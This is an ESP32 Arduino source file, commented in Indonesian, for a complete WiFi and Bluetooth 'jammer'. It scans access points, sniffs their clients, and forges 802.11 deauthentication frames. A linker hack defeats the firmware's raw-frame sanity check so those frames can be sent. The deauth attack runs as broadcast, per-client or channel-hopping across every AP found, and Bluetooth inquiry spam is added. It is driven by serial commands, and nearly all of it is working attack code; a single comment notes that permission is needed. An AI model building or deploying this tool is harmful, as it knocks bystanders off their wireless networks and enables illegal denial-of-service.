// ESP32 WiFi + Bluetooth Jammer - complete (classic ESP32 only, bukan S3/S2/C3/C6)
// Fitur:
//  - scan AP + sniff client per AP (promiscuous)
//  - deauth broadcast (AP) atau per-client
//  - channel hopping mode
//  - BT classic inquiry spam
//  - kontrol via Serial (115200): s=scan  a=deauth semua  0-9=pilih AP  c=deauth client AP terpilih  h=hop on/off  j=BT on/off  x=stop
// Legal: jamming RF butuh izin; gunakan di lingkungan sendiri/yang diberi izin.

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_bt_api.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2) {
  return (arg == 0 && arg2 == 0) ? 1 : 0;  // linker hack agar esp_wifi_80211_tx ikut di-link
}
extern "C" int esp_wifi_80211_tx(void *wifi, void *packet, int len, bool sys_seq);

#define MAX_APS 20
#define MAX_CLIENTS 8
#define MAX_TRACK 60   // ponytail: tabel MAC sederhana; tambah hash kalau AP >60

struct ApInfo {
  uint8_t bssid[6];
  char ssid[33];
  uint8_t channel;
  int clients;
};

struct MacEntry { uint8_t mac[6]; uint8_t channel; bool isClient; };

static ApInfo aps[MAX_APS];
static int apCount = 0;
static int selAp = -1;
static MacEntry tracked[MAX_TRACK];
static int trackedCount = 0;

static volatile bool hopping = false;
static volatile bool btJamOn = false;

// ---------- frame helper ----------
static const uint8_t DEAUTH[] = {
  0xc0, 0x00, 0x00, 0x00,
  0, 0, 0, 0, 0, 0,    // dst
  0, 0, 0, 0, 0, 0,    // src
  0, 0, 0, 0, 0, 0,    // bssid
  0x00, 0x00, 0x07, 0x00
};

static void sendDeauth(const uint8_t *dst, const uint8_t *bssid, uint8_t channel, int times) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[26];
  memcpy(frame, DEAUTH, 26);
  memcpy(&frame[4], dst, 6);
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  for (int i = 0; i < times; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
    delay(1);
  }
}

// ---------- sniffer ----------
static void snifferCb(void *buf, wifi_promiscuous_pkt_t *pkt, wifi_promiscuous_pkt_info_t *info) {
  if (pkt->rx_ctrl.sig_len < 32) return;
  const uint8_t *p = pkt->payload;
  uint8_t type = (p[0] >> 2) & 0x3, sub = (p[0] >> 4) & 0xf;
  const uint8_t *addr1 = p + 4, *addr2 = p + 10, *addr3 = p + 16;
  uint8_t ch = pkt->rx_ctrl.channel;
  if (type == 0 && sub == 8) {            // beacon: simpan AP
    for (int i = 0; i < apCount; i++)
      if (!memcmp(aps[i].bssid, addr2, 6)) { aps[i].channel = ch; return; }
    if (apCount < MAX_APS) {
      memcpy(aps[apCount].bssid, addr2, 6);
      aps[apCount].channel = ch;
      aps[apCount].clients = 0;
      strlcpy(aps[apCount].ssid, (const char *)p + 36, 33);  // ponytail: SSID offset kasar; SSID tersembunyi tampil kosong
      apCount++;
    }
  } else if (type == 2) {                 // data frame: BSSID terlibat = addr1 atau addr3
    const uint8_t *bss = (p[1] & 0x3) == 1 ? addr3 : addr1;
    for (int i = 0; i < apCount; i++) {
      if (!memcmp(aps[i].bssid, bss, 6)) {
        const uint8_t *sta = (bss == addr1) ? addr2 : addr1;
        // daftarkan client
        for (int t = 0; t < trackedCount; t++)
          if (!memcmp(tracked[t].mac, sta, 6)) return;
        if (trackedCount < MAX_TRACK && memcmp(sta, "\xff\xff\xff\xff\xff\xff", 6)) {
          memcpy(tracked[trackedCount].mac, sta, 6);
          tracked[trackedCount].channel = ch;
          tracked[trackedCount].isClient = true;
          aps[i].clients++;
          trackedCount++;
        }
        return;
      }
    }
  }
}

static void scanChannel(int secs) {
  for (uint8_t ch = 1; ch <= 13; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(secs);
  }
}

static void doScan() {
  apCount = 0;
  trackedCount = 0;
  memset(aps, 0, sizeof(aps));
  Serial.println("[*] scanning AP + client (3 detik, ch1-13)...");
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  scanChannel(230);
  Serial.printf("[+] %d AP ditemukan\n", apCount);
  for (int i = 0; i < apCount; i++)
    Serial.printf("  %d) %02x:%02x:%02x:%02x:%02x:%02x ch%02d clients=%d %s\n", i,
      aps[i].bssid[0], aps[i].bssid[1], aps[i].bssid[2],
      aps[i].bssid[3], aps[i].bssid[4], aps[i].bssid[5],
      aps[i].channel, aps[i].clients, aps[i].ssid);
}

static void deauthAllAp() {               // broadcast ke semua AP hasil scan
  for (int i = 0; i < apCount; i++)
    sendDeauth("\xff\xff\xff\xff\xff\xff", aps[i].bssid, aps[i].channel, 10);
  Serial.println("[*] deauth broadcast semua AP");
}

static void deauthClients() {             // per-client AP terpilih
  if (selAp < 0) { Serial.println("[!] pilih AP dulu (0-9)"); return; }
  int n = 0;
  for (int t = 0; t < trackedCount; t++)
    if (tracked[t].channel == aps[selAp].channel) {
      sendDeauth(tracked[t].mac, aps[selAp].bssid, aps[selAp].channel, 20);
      sendDeauth(aps[selAp].bssid, tracked[t].mac, aps[selAp].channel, 20);  // dua arah: client & AP
      n++;
    }
  Serial.printf("[*] deauth %d client AP %d\n", n, selAp);
}

static void hopLoop() {                   // serang semua AP bergiliran
  for (;;) {
    for (int i = 0; i < apCount; i++) {
      sendDeauth("\xff\xff\xff\xff\xff\xff", aps[i].bssid, aps[i].channel, 10);
      if (!hopping) { vTaskDelete(NULL); return; }
      yield();
    }
  }
}

// ---------- BT ----------
static void btStart() {
  esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BTDM);   // WiFi+BT coexist
  esp_bluedroid_init();
  esp_bluedroid_enable();
  btJamOn = true;
  Serial.println("[+] BT jam ON");
}
static void btStop() {
  esp_bluedroid_disable(); esp_bluedroid_deinit();
  esp_bt_controller_disable(); esp_bt_controller_deinit();
  btJamOn = false;
  Serial.println("[+] BT jam OFF");
}
static void btJamLoop() {                   // dipanggil berkala dari loop utama
  if (!btJamOn) return;
  esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 2, 0);
  delay(50);
  esp_bt_gap_cancel_discovery();
}

// ---------- main ----------
void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);
  Serial.println("\n0xJam ESP32 | s=scan a=deauth-all [0-9]=pilih c=deauth-client h=hop j=BT x=stop");
}

static TaskHandle_t hopTask;

void loop() {
  if (Serial.available()) {
    char c = Serial.read();
    switch (c) {
      case 's': doScan(); break;
      case 'a': deauthAllAp(); break;
      case 'c': deauthClients(); break;
      case 'h':
        if (!hopping && apCount > 0) {
          hopping = true;
          xTaskCreatePinnedToCore(hopLoop, "hop", 4096, NULL, 1, &hopTask, 0);
          Serial.println("[+] hop ON");
        } else if (hopping) {
          hopping = false;
          Serial.println("[+] hop OFF");
        }
        break;
      case 'j': btJamOn ? btStop() : btStart(); break;
      case 'x': hopping = false; if (btJamOn) btStop(); break;
      default:
        if (c >= '0' && c <= '9') {
          selAp = c - '0';
          if (selAp < apCount) Serial.printf("[+] AP %d dipilih: %s\n", selAp, aps[selAp].ssid);
          else selAp = -1;
        }
    }
  }
  btJamLoop();
  delay(10);
}
